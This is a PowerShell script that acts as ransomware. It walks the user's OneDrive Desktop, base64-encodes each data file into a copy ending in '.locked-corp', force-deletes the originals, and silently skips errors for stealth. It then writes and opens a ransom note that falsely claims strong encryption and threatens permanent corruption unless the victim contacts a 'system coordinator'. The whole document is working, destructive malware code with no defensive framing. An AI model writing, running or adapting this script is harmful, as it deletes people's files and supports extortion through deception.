# 1. Define Target Scope (Desktop)
$TargetDir = "$env:USERPROFILE\OneDrive\Desktop"
$Extension = ".locked-corp"
$RansomNotePath = "$TargetDir\RECOVERY_INSTRUCTIONS.txt"

# 2. Collect Data Files (Excluding dangerous system/binary/script types)
$ExcludedExtensions = @('.exe', '.dll', '.lnk', '.sys', '.ini', '.locked-corp', '.ps1', '.bat', '.vbs')
$Files = Get-ChildItem -Path $TargetDir -File -Recurse -ErrorAction SilentlyContinue | 
         Where-Object { $ExcludedExtensions -notcontains $_.Extension }

# 3. Stealthy Native Encoding (In-Memory Base64)
foreach ($File in $Files) {
    try {
        # Read raw bytes natively without external binaries
        $Bytes = [System.IO.File]::ReadAllBytes($File.FullName)
        $Base64 = [System.Convert]::ToBase64String($Bytes)
        
        # Write encoded data to new file extension
        $NewPath = $File.FullName + $Extension
        [System.IO.File]::WriteAllText($NewPath, $Base64)
        
        # Remove original file safely
        Remove-Item $File.FullName -Force
    } catch {
        # Silently skip locked or system-restricted files to maintain stealth
        Continue
    }
}

# 4. Formal Ransom Notification (Text Note)
$NoteContent = @"
ATTENTION:

All your corporate documents, databases, and critical files have been securely encrypted using a network-wide automated protocol. 

Your unique network ID has been assigned to this terminal. 
File Extension: .locked-corp

Any attempt to modify, rename, or decrypt these files using third-party software will result in permanent data corruption. 

To initiate the decryption process and obtain the private network key, contact the system coordinator immediately.
"@
Set-Content -Path $RansomNotePath -Value $NoteContent

# Open the ransom note automatically to signal execution completion
Start-Process notepad.exe -ArgumentList $RansomNotePath
